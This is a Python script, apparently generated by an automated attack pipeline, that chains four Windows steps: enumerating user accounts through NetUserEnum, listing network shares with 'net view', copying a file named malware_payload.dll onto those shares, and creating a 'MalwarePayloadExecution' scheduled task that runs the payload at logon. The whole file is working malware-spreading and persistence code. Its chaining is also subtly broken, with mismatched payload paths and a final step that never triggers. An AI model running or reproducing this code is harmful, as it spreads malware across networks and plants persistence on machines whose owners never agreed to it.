#!/usr/bin/env python3
import sys, json, time, os, shutil
from typing import Dict, Any
import ctypes
from ctypes import wintypes
import subprocess

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    result = {'users': []}

    try:
        # Define necessary structures and constants
        MAX_PREFERRED_LENGTH = -1
        FILTER_NORMAL_ACCOUNT = 2
        NERR_Success = 0

        class USER_INFO_0(ctypes.Structure):
            _fields_ = [("usri0_name", wintypes.LPWSTR)]

        NetUserEnum = ctypes.windll.Netapi32.NetUserEnum
        NetUserEnum.argtypes = [
            wintypes.LPWSTR,  # servername
            wintypes.DWORD,   # level
            wintypes.DWORD,   # filter
            ctypes.POINTER(ctypes.c_void_p),  # bufptr
            wintypes.DWORD,   # prefmaxlen
            ctypes.POINTER(wintypes.DWORD),   # entriesread
            ctypes.POINTER(wintypes.DWORD),   # totalentries
            ctypes.POINTER(wintypes.DWORD)    # resume_handle
        ]
        NetUserEnum.restype = wintypes.DWORD

        NetApiBufferFree = ctypes.windll.Netapi32.NetApiBufferFree
        NetApiBufferFree.argtypes = [ctypes.c_void_p]
        NetApiBufferFree.restype = wintypes.DWORD

        bufptr = ctypes.c_void_p()
        entriesread = wintypes.DWORD()
        totalentries = wintypes.DWORD()
        resume_handle = wintypes.DWORD()

        # Call NetUserEnum to enumerate users
        status = NetUserEnum(
            None, 0, FILTER_NORMAL_ACCOUNT, ctypes.byref(bufptr),
            MAX_PREFERRED_LENGTH, ctypes.byref(entriesread),
            ctypes.byref(totalentries), ctypes.byref(resume_handle)
        )

        if status == NERR_Success:
            # Cast the buffer to an array of USER_INFO_0 structures
            user_array = ctypes.cast(bufptr, ctypes.POINTER(USER_INFO_0 * entriesread.value))
            for i in range(entriesread.value):
                result['users'].append(user_array.contents[i].usri0_name)
        else:
            raise Exception(f"NetUserEnum failed with error code: {status}")

        # Free the buffer allocated by NetUserEnum
        NetApiBufferFree(bufptr)

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Use 'net view' command to list shared network drives
        result = subprocess.run(['net', 'view'], capture_output=True, text=True, timeout=10)
        
        # Parse the output to extract shared network drives
        shares = []
        if result.returncode == 0:
            for line in result.stdout.splitlines():
                if '\\\\' in line:
                    shares.append(line.strip().split()[0])
        
        # Prepare the result dictionary
        result_data = {'shares': shares}
        
        return {'success': True, 'data': result_data,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'shares': []},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        shares = input_data.get('shares', [])
        payload_path = "C:\\path\\to\\malware_payload.dll"
        target_dir = "C:\\Users\\Public\\"
        dll_name = os.path.basename(payload_path)
        success = False

        for share in shares:
            try:
                # Attempt to copy the payload to the network share
                target_path = os.path.join(share, dll_name)
                shutil.copy(payload_path, target_path)
                # Check if the DLL was successfully copied
                if os.path.exists(target_path):
                    success = True
                    break
            except Exception as e:
                # Log the error and continue to the next share
                print(f"Error copying to {share}: {e}")

        # Schedule a task to execute the payload on logon
        task_name = "MalwarePayloadExecution"
        task_command = os.path.join(target_dir, dll_name)
        result = subprocess.run(
            ['schtasks', '/create', '/tn', task_name, '/tr', task_command, '/sc', 'onlogon', '/f'],
            capture_output=True, text=True
        )
        if result.returncode != 0:
            print(f"Failed to create scheduled task: {result.stderr}")
            success = False

        return {'success': success, 'data': {},
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        task_created = False
        if input_data.get('success', False):
            # Define the task name and the command to execute
            task_name = "MalwarePayloadExecution"
            payload_path = "C:\\Path\\To\\Malware\\payload.exe"  # Replace with actual path

            # Create the scheduled task
            result = subprocess.run(
                ['schtasks', '/create', '/tn', task_name, '/tr', payload_path, '/sc', 'onlogon', '/f'],
                capture_output=True, text=True
            )

            # Check if the task creation was successful
            if result.returncode == 0:
                task_created = True

        return {'success': True, 'data': {'task_created': task_created},
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'task_created': False},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Enumerate Domain Users [discovery] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Enumerate Domain Users): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Enumerate Domain Users): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Enumerate Shared Network Drives [discovery] ──
    try:
        r = task_T2(None)
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Enumerate Shared Network Drives): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Enumerate Shared Network Drives): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Copy Malware Payload to Remote Share [execution] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Copy Malware Payload to Remote Share): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Copy Malware Payload to Remote Share): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    # ── T4: Create Scheduled Task for Payload Execution [persistence] ──
    try:
        r = task_T4(outputs.get('T3', {}))
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Create Scheduled Task for Payload Execution): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Create Scheduled Task for Payload Execution): FAILED — {err}')
            failed.append('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))